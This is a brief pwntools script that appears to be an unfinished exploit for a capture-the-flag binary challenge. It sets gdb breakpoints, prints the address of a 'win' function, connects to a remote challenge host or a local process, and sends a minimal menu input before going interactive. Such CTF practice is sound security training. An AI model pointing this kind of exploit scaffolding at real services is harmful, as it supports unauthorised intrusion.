#!/usr/bin/python3

from pwn import *

exe = ELF('source', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*process+471
                b*process+198
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('where-is-my-book-0fdb028b.dailycookie.cloud', 30918)
else:
        p = process(exe.path)

GDB()
info(hex(exe.sym['win']))
sla(b"read?", b"4")
sla(b"read:", b"a" * 1)
p.interactive()
